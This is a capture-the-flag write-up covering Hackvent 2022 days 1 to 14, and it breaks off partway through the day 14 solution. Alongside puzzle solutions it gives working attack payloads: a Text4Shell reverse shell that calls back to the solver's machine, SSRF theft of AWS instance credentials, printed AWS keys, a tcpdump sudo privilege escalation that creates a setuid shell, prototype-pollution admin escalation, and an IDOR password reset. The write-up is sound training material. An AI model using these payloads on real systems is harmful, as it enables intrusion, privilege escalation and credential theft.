# Write-up Hackvent 2022

## Intro and credits

This is my write-up for the 2022 Hackvent on hacking-lab.com.
Hackvent is a remote, public and free-to-play jeopardy-style CTF.
Each day during advent, one challenge gets released. 
As christmas approaches, the difficulty of every new challenge increases by a bit. 
You can read more about it [here](https://hacking-lab.com/events/hackvent-2022#what-is-hackvent).

Hackvent is organised by Compass Security and many volunteers contributing challenges and maintaining infrastructure for things to work smoothly.

I want to thank everyone for letting me learn and discover new fields and unknown corners of already explored areas. Thanks a lot kuyaya for keeping challenges stable and hackers engaged.

This year, I approached the web3 challenges as purely educational, but with a goal of solving them all as I wanted to aquire more knowledge in this area - many thanks to HaCk0 for your challenges and to mcia for helping me getting unstuck many times. I learned a ton of new stuff thanks to you.

Further credits go to all the challenge creators for the awesome challenges and of course to all the hackers for solving them (especially the ones where I gave up from the outset).

Finally, I want to thank my family as this was again another layer on top of an already busy December.

Happy reading,
-ludus

## Licensing and material

Challenge descriptions and source material was taken from Hacking-lab.com with the permission of the organisers and authors of challenges.

## [HV22.01] QR means quick reactions, right?

<table>
  <tr>
    <th>Categories</th>
    <td>Fun</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>easy</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>Deaths Pirate</td>
  </tr>
</table>

### Description
Santa's brother Father Musk just bought out a new decoration factory. He sacked all the developers and tried making his own QR code generator but something seems off with it. Can you try and see what he's done wrong?

![QR ball](../dec01/326b39e0-ccf5-4b94-88ff-e1b654e2c5b9.gif)

### Solution
- Split the provided GIF into its frames using an online service, for example https://ezgif.com/split.
- Read the resulting QR codes one by one.

### Flag
```
HV22{I_CaN_HaZ_Al_T3h_QRs_Plz}
```
## [HV22.02] Santa's song

<table>
  <tr>
    <th>Categories</th>
    <td>Fun</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>easy</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>kuyaya</td>
  </tr>
</table>

### Description
Santa has always wanted to compose a song for his elves to cherish their hard work. Additionally, he set up a vault with a secret access code only he knows!

The elves say that Santa has always liked to hide secret messages in his work and they think that the vaults combination number may be hidden in the magnum opus of his.

What are you waiting for? Go on, help the elves!

The provided pdf with [sheet music](../dec02/song.pdf).

#### Hints
**Hint #1**: Keep in mind that you are given a web service, not a play button for a song.

**Hint #2**: As stated in the description, Santa's vault accepts a number, not text.

### Solution
The sheet music translates to the following musical notes:
```
 b a e  | f a c e d  | a | b a d | d e e d
```
Convert the resulting hex number to decimal:
```
ba ef ac ed ab ad de ed => 13470175147275968237
```

Enter the number (`13470175147275968237`) to the webservice and see flag.

### Flag
`HV22{13..s0me_numb3rs..37}`

### Resources
- [Sheet music](https://blog.sheetmusicplus.com/2015/12/30/learn-how-to-read-sheet-music-notes/)
- Calc
## [HV22.03] gh0st

<table>
  <tr>
    <th>Categories</th>
    <td>Fun, Crypto</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>easy</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>0xdf</td>
  </tr>
</table>

### Description

The elves found this Python script that Rudolph wrote for Santa, but it's behaving very strangely. It shouldn't even run at all, and yet it does! It's like there's some kind of ghost in the script! Can you figure out what's going on and recover the flag?

### Solution
Null bytes and python are not a good match.

Modify the source file as follows to print out the flag.
```diff
--- gh0st.py    2022-12-29 18:19:06.838727817 +0100
+++ gh0st_mod.py        2022-12-29 18:36:37.261604169 +0100
@@ -44,8 +44,10 @@
 flag = list(map(ord, sys.argv[1]))
 correct = [17, 55, 18, 92, 91, 10, 38, 8, 76, 127, 17, 12, 17, 2, 20, 49, 3, 4, 16, 8, 3, 58, 67, 60, 10, 66, 31, 95, 1, 93]
 
-for i,c in enumerate(flag):
-    flag[i] ^= ord(song[i*10 % len(song)])
+for i,c in enumerate(correct):
+    correct[i] ^= ord(song[i*10 % len(song)])
+
+print("".join([chr(c) for c in correct]))
 
 if all([c == f for c,f in zip(correct, flag)]):
     print('''Congrats!''')
```

### Flag
```
HV22{nUll_bytes_st0mp_cPy7h0n}
```
## [HV22.04] Santa's radians

<table>
  <tr>
    <th>Categories</th>
    <td>Fun</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>easy</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>dr_nick</td>
  </tr>
</table>

### Description
Santa, who is a passionate mathematician, has created a small website to train his animation coding skills. Although Santa lives in the north pole, where the degrees are very low, the website's animation luckily did not freeze. It just seems to move very slooowww. But how does this help...? The elves think there might be a flag in the application...

### Solution
See [solver.js](../dec04/solver.js).

### Flag
```
HV22{C4lcul8_w1th_PI}
```
## [HV22.05] Missing gift

<table>
  <tr>
    <th>Categories</th>
    <td>Fun, Forensic, Network Security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>easy</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>wangibangi</td>
  </tr>
</table>

### Description
Like every year the elves were busy all year long making the best toys in Santas workshop. This year they tried some new fabrication technology. They had fun using their new machine, but it turns out that the last gift is missing.

Unfortunately, Alabaster who was in charge of making this gift is not around, because he had to go and fulfill his scout elf duty as an elf on the shelf.

But due to some very lucky circumstances the IT-guy elf was capturing the network traffic during this exact same time.

Goal:
Can you help Santa and the elves to fabricate this toy and find the secret message?

### Solution

Find the `gcode` file upload in the pcap file.

Visualise the `gcode` file in a service such as https://gcode.ws and read the flag.

### Notes
Interesting frames:
- 1196
- 1197
- 5449 hints towards a file /downloads/files/local/hv22.gcode
- 3078 JS code
- 5443 POST to write a file.  <===

------WebKitFormBoundaryAsNAHrCNGBeryZ8A
Content-Disposition: form-data; name="file"; filename="hv22.gcode"
Content-Type: application/octet-stream

[...]

------WebKitFormBoundaryAsNAHrCNGBeryZ8A--

Used https://gcode.ws/ to visualise the `gcode` file and read the flag.


### Flag
```
HV22{this-is-a-w4ste-of-pl4stic}
```
## [HV22.06] privacy isn't given

<table>
  <tr>
    <th>Categories</th>
    <td>Exploitation</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>easy</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

### Description
As every good IT person, Santa doesn't have all his backups at one place. Instead, he spread them all over the world.
With this new blockchain unstoppable technology emerging (except Solana, this chain stops all the time) he tries to use it as another backup space. To test the feasibility, he only uploaded one single flag. Fortunately for you, he doesn't understand how blockchains work.

Can you recover the flag?

----

#### Information
Start the Docker in the Resources section. You will be able to connect to a newly created Blockchain. Use the following information to interact with the challenge.

Wallet public key 0x28a8746e75304c0780e011bed21c72cd78cd535e
Wallet private key 0xa453611d9419d0e56f499079478fd72c37b251a94bfde4d19872c44cf65386e3
Contract address: 0xe78A0F7E598Cc8b0Bb87894B0F60dD2a88d6a8Ab

The source code of the contract is the following block of code:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract NotSoPrivate {
    address private owner;
    string private flag;

    constructor(string memory _flag) {
        flag = _flag;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function setFlag(string calldata _flag) external onlyOwner {
        flag = _flag;
    }
}
```

### Solution
Read the flag from the blockchain storage directly by reading out data from the address at which the contract in question is located at.

#### Solver
```
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://152.96.7.11:8545'))
r = w3.eth.get_storage_at('0xe78A0F7E598Cc8b0Bb87894B0F60dD2a88d6a8Ab', 1)
print(bytes(r).decode('UTF-8'))
```

### Notes

Tools:
- Metamask https://metamask.io/
- Remix https://remix.ethereum.org/

Core issue: Even though the flag field was marked `private`, this has no influence on the data visibility. [Blockchains and smart contracts are always public](https://docs.soliditylang.org/en/latest/security-considerations.html#private-information-and-randomness). Therefore, we are able to simply read the flag value at the indicated address.


### Flag
```
HV22{Ch41nS_ar3_Publ1C}
```
## [HV22.07] St. Nicholas's animation
<table>
  <tr>
    <th>Categories</th>
    <td>Fun</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>easy</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>kuyaya</td>
  </tr>
</table>

### Description

Santa has found a weird device called an "Oxocard Blockly", which seems to display a sequence of images. He believes it has got something to do with a QR code, but it doesn't seem complete...

You can't fly to the north pole, so Santa sent you a video of the device in action.

The elves are having a karaoke and left with in a hurry while singing into their micro. This means that they aren't there to help him, so now is your chance to make a good impression and find the flag!

See [Video](https://youtu.be/thkeQU0CXyI).

[![St. Nicholas' animation](http://img.youtube.com/vi/thkeQU0CXyI/0.jpg)](http://www.youtube.com/watch?v=thkeQU0CXyI "St. Nicholas' animation")

### Solution
The video show four sections of a micro-QR code and how to assemble them back to a readable QR code.

Do so and get the following image:

![Readable micro-QR code](../dec07/micro-qr-flag.jpg)

Read this with a QR code reader (you might have to wiggle a bit).

### Notes
Screenshot of video.
Assemble micro-QR code.

### Flag
```
HV22{b0f}
```
## [HV22.08] Santa's Virus

<table>
  <tr>
    <th>Categories</th>
    <td>Open-source intelligence</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>yuva</td>
  </tr>
</table>

### Description
A user by the name of HACKventSanta may be spreading viruses. But Santa would never do that! The elves want you to find more information about this filthy impersonator.

![Evil santa](../dec08/37ff7417-5c2d-46bc-985c-715e6193d57a.jpg)

### Solution
This was a cat and mouse game through popular platforms, exploiting the open source information they provide.
Only with Twitter (if I'm not mistaken) one had to have a registered and logged in user.

The following steps were followed:
- Reverse image search and the picture's alternative name (`1668610707921`) lead to LinkedIn https://ch.linkedin.com/pub/dir/+/Hacker/ch-0-Schweiz (on an icognito browser).
- LinkedIn profile: https://ch.linkedin.com/in/hackventsanta
- Portfolio leads to: https://github.com/HackerSanta
- Has a release with the name "TAG": https://github.com/HackerSanta/FILES/releases/tag/HV22
- Has a file with the name `Undetected`.
- Running strings on this provides a string `ThisIsTheKeyToReceiveTheGiftFromSanta`.
- Uploading the file to Virustotal gives the info: "Almost there - Twitter-SwissSanta2022": https://www.virustotal.com/gui/file/4d0e17d872f1d5050ad71e0182073b55009c56e9177e6f84a039b25b402c0aef/details
- Twitter profile: https://twitter.com/SwissSanta2022
- 3 tweets with links:
  - https://tinyurl.com/4yekektd
  - https://qr1.be/H8YX
  - https://drive.google.com/file/d/11pKYrcwr7Hf1eSUq8twtN5aMK-oziPE4/view?usp=sharing
- The last Google Drive link is password protected. Use password `ThisIsTheKeyToReceiveTheGiftFromSanta`.
- Decode the Base64 string: https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=U0ZZeU1udElUMGhQSzFOQlRsUkJLMGRKVmtWVEswWk1RVWRUSzA1UFZDdFdTVkpWVTMwPQ
- Read the flag.

### Credits
Thanks to the FAIRTIQ security team for the entertaining solving session.

### Flag
```
HV22{HOHO+SANTA+GIVES+FLAGS+NOT+VIRUS}
```
## [HV22.09] Santa's Text

<table>
  <tr>
    <th>Categories</th>
    <td>Penetration testing</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>yuva</td>
  </tr>
</table>

### Description

Santa recently created some Text with a 🐚, which is said to be vulnerable code. Santa has put this Text in his library, putting the library in danger. He doesn't know yet that this could pose a risk to his server. Can you backdoor the server and find all of Santa's secrets?


### Solution
The service does a ROT13 on the entered text.

Changing query params to the following produces an error page that looks like a Java/Tomcat (or similar) error page: 
```
https://<host>/santa/attack?search=((%3E%22\\)&bla=9843u53SF
```

Reading the description again, there's a clear hint towards "Text4Shell", one of the big Java library vulnerabilities, this year with the CVE number [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889).

A simple way to confirm Text4Shell, is to issue a http request to my own machine ([source](https://www.neosec.com/blog/vulnerability-explained-remote-code-execution-through-text4shell)).

But first, since the network elves have done their work and machine cannot talk to the outside, I had to connect to the CTF VPN first.
2h later (see "Notes" below), I was able to receive requests from the vulnerable machine.

So, I spun up a listening netcat (`nc -l 9090`) and used the following payload to provoke a http request in return:
```
${url:UTF-8:http://10.13.0.26:9090}
```

The ROT13 part requires us to either copy&paste the first input or to apply ROT13 before sending the payload. The final request triggering this callback looks as follows:
```
https://<host>/santa/attack?search=grfg%24%7Bhey%3AHGS-8%3Auggc%3A%2F%2F10.13.0.26%3A9090%7D
```
With this, `nc` prints out the incoming request (Don't forget to disable the firewall! ;) ):
```
GET / HTTP/1.1
User-Agent: Java/13.0.12
Host: 10.13.0.26:9090
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

Yay, so the Text4Shell bit is right. Now let's try to get a reverse shell with the following payload ([source](https://cloudsecurityalliance.org/blog/2022/12/02/detecting-and-mitigating-cve-2022-42889-a-k-a-text4shell/)):
```
${script:javascript:java.lang.Runtime.getRuntime().exec('nc 10.13.0.26 9090 -e /bin/sh')}
```

Resulting in the explointing request: 
```
https://<host>/santa/attack?search=%24%7Bfpevcg%3Awninfpevcg%3Awnin.ynat.Ehagvzr.trgEhagvzr%28%29.rkrp%28%27ap+10.13.0.26+9090+-r+%2Fova%2Ffu%27%29%7D
```

Typing in `ls` on our `nc` session discloses that the server has connected by listing a few files.
After some browsing around on the server, we can find the flag at `/SANTA/FLAG.txt`.
```sh
cat /SANTA/FLAG.txt
HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}
```

#### Links
- https://www.docker.com/blog/security-advisory-cve-2022-42889-text4shell/
- https://www.neosec.com/blog/vulnerability-explained-remote-code-execution-through-text4shell
- https://cloudsecurityalliance.org/blog/2022/12/02/detecting-and-mitigating-cve-2022-42889-a-k-a-text4shell/

### Notes
HL VPN did not work through my home router. It finally worked through my mobile hotspot. (which is weirdo, Swisscom! No fingerpointing, plz).

### Flag
```
HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}
```
## [HV22.10] Notme

<table>
  <tr>
    <th>Categories</th>
    <td>Web security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

### Description
Santa brings you another free gift! We are happy to announce a free note taking webapp for everybody. No account name restriction, no filtering, no restrictions and the most important thing: no bugs! Because it cannot be hacked, Santa decided to name it Notme = Not me you can hack!

Or can you?

### Solution
Fast-forward: It turned out, the way I solved this challenge was not the intended one. I only found out about this when reading the flag.

I approached the challenge as other "web security" challenges: Looking at API traffic and trying out variations of the requests or simply other user IDs.
While doing so, I realised a few things:

- my user seems to have a `user` role.
- passwords were simply SHA-256 hashes.
- there must have been an additional user somewhere (Santa, is it you?)

I discovered, that the user update request did not check the user ID, so I could update the password for any user on the system.
A classical (unintended) Insecure Direct Object Reference (IDOR) vulnerability.

Iterating through the user IDs (using Burp Suite), I was able to update the password of user `1337`, which happened to be Santa.
```
$ curl 'https://4503b1b0-2da2-49a6-a974-d3f5df08a0a4.idocker.vuln.land/api/user/1337'   -H 'content-type: application/json'   -H 'cookie: connect.sid=s%3A36fy1tBYkOnN9bmgg66SaGJM05jlPWJL.mERSYxoLsvQY0HKKRfK%2B7HcTCIFLdA2GLxDrvE6ttSA'   --data-raw '{"password":"test"}'   -i
HTTP/2 200 
content-type: application/json; charset=utf-8
date: Fri, 09 Dec 2022 23:37:54 GMT
etag: W/"c8-XrArzR2AlPhw3vjMP3KIXgaJz2Q"
x-powered-by: Express
content-length: 200

{"id":1337,"role":"user","username":"Santa","password":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08","createdAt":"2022-12-09T23:00:55.271Z","updatedAt":"2022-12-09T23:35:31.831Z"}
```

After logging in as santa, there was a note containing the flag.

### Flag
```
HV22{Sql1_is_An_0Ld_Cr4Ft}
```
## [HV22.11] Santa's Screenshot Render Function

<table>
  <tr>
    <th>Categories</th>
    <td>Web security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>Deaths Pirate</td>
  </tr>
</table>

### Description
Santa has been screenshotting NFTs all year. Now that the price has dropped, he has resorted to screenshotting websites. It's impossible that this may pose a security risk, is it?

You can find Santa's website here: https://hackvent.deathspirate.com


### Solution
This was probably the most controversial challenge of this Hackvent.

The beginning was easy.

The provided website was a service to take screenshots of websites at a given URL.
From the UI, it was pretty clear, the website was running on some AWS service, potentially Elastic Compute Cloud (EC2).

The website's UI loaded an image from an open S3 bucket located at `https://hackvent2022.s3.eu-west-2.amazonaws.com/`.
When navigating to it, it listed the bucket's contents:
```xml
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Name>hackvent2022</Name>
<Prefix/>
<Marker/>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
<Contents>
    <Key>3723050.png</Key>
    <LastModified>2022-11-05T17:34:55.000Z</LastModified>
    <ETag>"74b18f977180ce6366f8ef8954409781"</ETag>
    <Size>57382</Size>
    <StorageClass>STANDARD</StorageClass>
</Contents>
<Contents>
    <Key>aws-logo-500x500.webp</Key>
    <LastModified>2022-11-06T02:48:24.000Z</LastModified>
    <ETag>"a8e941e05c0f0419183c8438c1310bc5"</ETag>
    <Size>10936</Size>
    <StorageClass>STANDARD</StorageClass>
</Contents>
<Contents>
    <Key>flag1.txt</Key>
    <LastModified>2022-11-05T17:34:56.000Z</LastModified>
    <ETag>"0011e3e5a6dbde2218af677401f8f9b2"</ETag>
    <Size>306</Size>
    <StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```

The bucket contains a file [flag1.txt](https://hackvent2022.s3.eu-west-2.amazonaws.com/flag1.txt), typing out the first bit of the flag:
```
HV22{H0_h0_h0_H4v3_&_
```

Next, we had to leverage the screenshotting service to gain more information.

["The Pentest book" on AWS cloud enumeration](https://pentestbook.six2dez.com/enumeration/cloud/aws) was helpful there.
AWS EC2 instances can reach out to a meta data URL (also hinted to by the UI) to list data associated with the box. The information can only be called by EC2 instances and not from the outside. 
Perfect for our challenge.

The meta data root URL is at http://169.254.169.254/latest/meta-data/.

"Screenshotting" this URL allowed me to get to the entry located at http://169.254.169.254/latest/meta-data/iam/security-credentials/Hackvent-SecretReader-EC2-Role, which sounds promising for a secret reader role to take over.

Screenshotting this URL allowed me to get a picture of the AWS key ID, the secret key and the token - all needed in order to be able to interact with the AWS API. 
This represented a picture of about 1300 characters to be taken over from the picture somehow.

![AWS secrets in an image](../dec11/r0_SecretReaderRole_1119.png)

Gladly, it was a Sunday (although sunny).

I OCR-ed the image and error checked it line by line manually (see other write-ups for more automated approaches).

```sh
export AWS_ACCESS_KEY_ID="ASIA4G76YFUNCD7WTCDZ"
export AWS_SECRET_ACCESS_KEY="J9q91oLNm7YYoHdlf4dbpjHWI5l8+ZoWdeHSl6HD"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGIaCWV1LXdlc3QtMiJHMEUCIQCLXSwcqP9jRXzbDaqIm4A/Jlh5tEE47ONLRAt/eYPSUgIgLNQqvsmtAL3h11ILDEEwTRIEFW0B08MZ87iR7UrRizQq1gQIi///////////ARAAGgw4Mzk2NjM0OTY0NzQiDJXGI4nJRAHN6kewCyqqBB7fcIbTsFeNNnXV1NvqRejo3rpmwbY4VFtfekHnWRc/8Xd99jAmIa4iqQZqhLYe7ldjzjyc6LHpiCZFsBG/W498U+hJ9OejRtnV64U92BX0QNpktysYzVHwv2SESccvJkDxDx93mWY2zlhnyGJFvAGL4P2adozfJuHrUJUa6rTtZ5CUjhSLnvFUHpkZasShqc2squ4OtmWm8vLnW8lBa2vc0M/rYGPZ74pueVQx0nx9hrN8Qdr+2xS++OsT/1+k0XoR6bYimyoghEG+iHGc3kMF4E3HoK3ngzQoLN4Yw+1YGibE93J/nKqEnsP0KFvsIk5l4ul3fcoNGEA0FmacmBpCzVu3uSJDtx8VVgCx9U18lQ5xXFGN0Q+E7Z8Bpm9lBekSs0iYaOsJ1vCvkUq1OxKImDNk1ZXrodndvXD3FtjBT+JcsbE8salnL9aNL2TJGF4GIWAVKxGIJ0VbA5ZdBZ/r7E1ll6ZSJV3UA85OmqI1DQqxscgPqtRPOEYhKTvYOv06W4XQPIsV1DQRyBjlFY1pFdcPrd81jyYCokSYNOXX220AwILId0s8s3AhhOtQp3nLHLLk6keMo73J8kOeUXTZm/uxz9b0Ab1IHexFKjCsT+oEDgoyGRVbJOi7RAeYwD/QWaWL+gdXVSIUsVBVKWPz0BqwpEcV1lj1bbOAVG6gwnhEIQMnQH4slssIm4F1yGHIE3kqANZrqgvinK7+u0/zG3Ykh8G8uN+MMMHS1pwGOqkB4wUCmog4JVVjMWcCEQif3CaUfMZp4u0Ifs6UdHgCh8ZjWnr/GwGp7KvEuwjmmlC7mLqMGdAGMcg3miqVZ9D3ks8dKGD+BI4sn4CtGNaAKsICobG1PChQUL47Siqk6WZnIONnyj2SMcVcghP9UZTvZVYWEPRw3qyCcWdc1WYyTqREQi+dUoMH1JCaqOyYyszlo8lDZ2cWdLpDsPFXnyFcASFdq5uOqY/+EQ=="
```

Once I managed to connect to the API using the `aws` CLI, I tried to list secrets in Secret Manager (as hinted to by the role name).

```
$ aws secretsmanager list-secrets
{
    "SecretList": []
}
```

I felt like in a bad western film, where you can only hear the crickets in the background...

After enumerating and scanning all possible AWS services using [weirdAAL](https://github.com/carnal0wnage/weirdAAL), I realised that I did query the default region every time.

Let's set the `eu-west-2` region (from the initial S3 URL) explicitly - and, tadaa, here we are:
```
$ aws --region eu-west-2 secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
            "Name": "flag2",
            "Description": "Flag for hackvent 2022",
            "LastChangedDate": "2022-12-10T22:04:51.135000+01:00",
            "LastAccessedDate": "2022-12-11T01:00:00+01:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "3cb95787-eea6-475b-9b5b-16bac83b449d": [
                    "AWSPREVIOUS"
                ],
                "8a498b78-e73f-4a97-a0c3-74f365d3aa0d": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2022-11-05T18:44:58.369000+01:00"
        }
    ]
}

$ aws --region eu-west-2 secretsmanager get-secret-value --secret-id flag2
{
    "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
    "Name": "flag2",
    "VersionId": "8a498b78-e73f-4a97-a0c3-74f365d3aa0d",
    "SecretString": "{\"flag2description\":\"Oh Hai! Santa made us split the flag up, he gave this part to me and told me to put it somewhere safe, I figured this was the best place.  The other half he gave to another Elf and told him the same thing, but that Elf told me he just threw it into a bucket!  That doesn't sound safe at all!\",\"flag2\":\"M3r2y-Xm45_Yarr222_<3_Pirate}\",\"what_is_this\":\"Oh I forgot to mention I overheard some of the elves talking about making tags available ... maybe they mean gift tags?! Who knows ... maybe you can make something out of that ... or not :D \"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2022-12-10T22:04:51.128000+01:00"
}
```

### Notes
Meta data URL candidates were the following. But the one including the role name looked the most promising:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/Hackvent-SecretReader-EC2-Role   # temporary; 11:00 token ends in Xxy7Ew== (exp: 15:25)
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance   # seems fix; 11:00 token ends in PYcWI== (exp: 15:26)
http://169.254.169.254/latest/meta-data/auth-identity-credentials/ec2/security-credentials/ec2-instance   # tbd; 11:00 token ends in uehGdM==  (exp: 15:30)
```

### Flag
```
HV22{H0_h0_h0_H4v3_&_M3r2y-Xm45_Yarr222_<3_Pirate}
```

### Hidden Flag 02
Run the "screenshot service" to screenshot this: `http://169.254.169.254/latest/meta-data/tags/instance/hidden_flag`

```
HV22{5G0ldRing5QuickGetThem2MtDoom}
```
## [HV22.12] Funny SysAdmin

<table>
  <tr>
    <th>Categories</th>
    <td>Linux</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>wangibangi</td>
  </tr>
</table>

### Description
Santa wrote his first small script, to track the open gifts on the wishlist. However the script stopped working a couple of days ago and Santa has been stuck debugging the script. His sysadmin seems to be a bit funny ;)

#### Goal
Can you find the secret flag on the box?

Start the resources in the Resources section to find out!


### Solution

- The .ash_history revealed that user `santa` was able to run tcpdump.
- Privilege escalation with tcpdump: `sudo tcpdump -n -i any -G 1 -z ./doit.sh -w out.pcap` ([source](https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/)).
- The `find` binary was replaced with a dummy script.
- Let's use `busybox` directly: `/bin/busybox find / > /home/santa/find.out`
- Grep the file for "flag" and find `/root/secret/flag.txt`
- Copy that file over to `/home/santa` and change permissions.
- Profit.

All of these steps were done through the following script that I adjusted as we went on and re-ran it in a privileged context as root via tcpdump.

```
cat > doit.sh <<EOF
##!/usr/bin/env bash
id
cp /root/secret/flag.txt /home/santa/flag.txt
chmod +r /home/santa/flag.txt
/bin/busybox find / > /home/santa/find.out

chmod +r /var/log/wishlist.log
cp /bin/bash /home/santa/bash
chmod u+s /home/santa/bash
cat /etc/sudoers
##ls -al cat /etc/sudoers.d/
##cat /etc/sudoers.d/*
##cat >/etc/sudoers <<EOFF
##santa   ALL=(ALL:ALL) ALL
##EOFF
## cat /var/log/wishlist.log | tee ./out.log
EOF

## Make the script executable.
chmod +x doit.sh

## Invoke the script.
sudo tcpdump -n -i any -G 1 -z ./doit.sh -w out.pcap
```

### Other approaches
Other approaches would have involved:

- Check allowed sudo commands with `sudo -l`.
- Use `sudo less` to dump file contents readable by root.
    - Inside `less`, one can open (examine) another file via `:e <file>` and save contents from the current file to another file via `:s <otherfile>`.
    - With this, contents of `/etc/sudoers` could have been overwritten.
    - Conclude with `sudo -i` (to get a root shell using santa's password taken from the environment)
- A rather brute-force approach: Run `chmod 777 -R /` as root within the script run via tcpdump.

### Links
- https://gtfobins.github.io/gtfobins/tcpdump/

### Flag
```
HV22{M4k3-M3-a-S4ndW1ch}
```
## [HV22.13] Noty

<table>
  <tr>
    <th>Categories</th>
    <td>Web Security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

### Description
After the previous fiasco with multiple bugs in Notme (some intended and some not), Santa released a now truly secure note taking app for you. Introducing: Noty, a fixed version of Notme.

Also Santa makes sure that this service runs on green energy. No pollution from this app ;)

### Solution
Noty - not again.. :D

Noty is a fixed version of Notme - even the unintended solution has been fixed this time.

After some struggling, `mcia` pointed me to the obvious hint in the description.
This challenge was about some "pollution" attack.
There are two that are known:
- Query/request parameter pollution ([explained here](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications)).
- Prototype pollution on a JS application (client- and server-side).

Since there are now query parameters used in this webapp and the webserver seemingly being ExpressJS, I went for the latter.

Several attempts later, each one breaking the application, because new properties were added to all objects, I managed to find the right place to pollute, which was the user registration/creation endpoint.

Here are a few attempts, each crashing the application:

Try overriding the password or the hash of it. This one added `username` and `password` properties to all objects on the server.
```json
{
"username":"test3",
"password": "test",
"__proto__": {
    "username":"test4",
    "password":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
}}
```

Try overriding the user's ID. This one added an `id` property to all objects.
```json
{
"username":"test2",
"password": "test",
"__proto__": {
    "id": 1337
}}
```

Be desperate:
```json
{"username":"test2","password":"test", "__proto__":{"toString": "blah"}}  

=> {"error":"Object.prototype.toString.call is not a function"}
```

**Final solution**: Grant myself the `admin` role.

Create a user:
```json
## Request payload
{"username":"test1","password":"test", "__proto__": {"role": "admin"}}

## Response
=> {"id":2,"username":"test1","password":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08","role":"admin","updatedAt":"2022-12-13T21:09:23.730Z","createdAt":"2022-12-13T21:09:23.730Z"}
```

And then, using the returned session, list all notes 🎉:
```json
## Request
GET /api/note/all HTTP/2
Cookie: ...

## Response
[{
    "id":1337,
    "note":"HV22{P0luT1on_1S_B4d_3vERyWhere}",
    "userId":1337,
    "createdAt":"2022-12-13T21:08:02.730Z",
    "updatedAt":"2022-12-13T21:08:02.730Z"
},
{
    "id":1,
    "note":"asdfsdfsaf",
    "userId":1,
    "createdAt":"2022-12-13T21:08:26.254Z",
    "updatedAt":"2022-12-13T21:08:26.254Z"
}]
```

### Links
- https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7?gi=5ea0c35d5552
- https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications
- https://github.com/var77/proto-pollution-owasp-yerevan
- https://learn.snyk.io/lessons/prototype-pollution/javascript/
- https://hackernoon.com/how-to-exploit-prototype-pollution

### Flag
```
HV22{P0luT1on_1S_B4d_3vERyWhere}
```
## [HV22.14] Santa's Bank

<table>
  <tr>
    <th>Categories</th>
    <td>Web Security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

### Description
Santa has lost faith and trust in humanity and decided to take matters in his own hands: He opens a new bank.

He announced the release with the following message:

For Christmas, our bank has a generous offer: save 100 € in your savings account and get a promo code!

Due to mistrust, he didn't connect his bank and its employees to the internet.

Can you hack bank?

### Solution
From the challenge description and the web app, I concluded the following:
- Find a different account with a balance of >100$.
- Transfer 100$ to our account from that other account.

The support page looks suspicious. We can paste a URL that then gets opened by a support agent? Awesome!

![Support page](../dec14/dec14-support.png)

To validate the assumption, I connected via VPN and started a `nc -l 1234` on my machine.

The URL dropped on the support page was something like `http://<my-ip-address>:1234`.

